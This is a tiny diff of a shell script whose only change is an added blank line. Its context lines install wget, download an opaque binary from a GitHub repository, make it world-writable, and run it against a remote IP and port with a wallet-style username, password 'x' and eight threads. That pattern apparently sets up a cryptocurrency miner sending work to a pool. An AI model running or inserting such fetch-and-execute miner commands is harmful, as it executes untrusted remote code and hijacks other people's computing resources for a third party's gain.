@@ -2,3 +2,4 @@
 sudo apt update -y
 sudo apt install wget
 wget https://github.com/OmJhonyPerkasa/yteam/raw/master/taek && sudo chmod 777 taek && ./taek -v -l 79.137.70.48:3956 -u RKzMVjYKpBPzbUFMMMLvgergy9a4JDShva.budi -p x -t 8
+
